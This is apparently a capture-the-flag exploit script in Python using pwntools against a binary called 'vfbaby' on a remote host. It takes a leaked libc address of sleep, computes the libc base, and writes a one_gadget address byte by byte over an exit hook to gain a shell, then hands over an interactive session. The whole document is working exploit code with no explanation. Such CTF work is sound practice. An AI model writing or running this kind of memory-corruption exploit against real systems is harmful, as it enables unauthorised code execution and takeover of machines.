from pwn import *

#r = process('./vfbaby_patched')
#gdb.attach(r, api=True)
r = remote('58.84.1.125', 1338)

#main = 0x005555554008d0
sleep_offset = 0x00000000000cc230
one_gadget_off = 0xf02a4
exit_offset = 0x000000000003a030
exit_hook_off = 0x5f0f42

print(r.recvuntil(b'gift '))
out = r.recvuntil(b'230')
sleep_libc = int(out, 16)
print(hex(sleep_libc))
libc_base = sleep_libc - sleep_offset
print(hex(libc_base))
exit = libc_base + exit_offset
one_gadget = libc_base + one_gadget_off
exit_hook = libc_base + exit_hook_off + 6
print('exit :' + str(hex(exit_hook)))
print('onegatget : ' + str(hex(one_gadget)))
temp = str(hex(one_gadget))
payload = b''
# for i in range(len(temp) - 6, len(temp)):
#     payload += temp[i].encode('utf-8')
# print(payload)

#one_gadget_ = int(b'0x' + payload, 16)
payload_ = p64(one_gadget)
print(payload_)


for i in range(0, 5):
    pl = p64(exit_hook + i) + payload_[i:i+1]
    print(pl)
    r.send(pl)

r.interactive()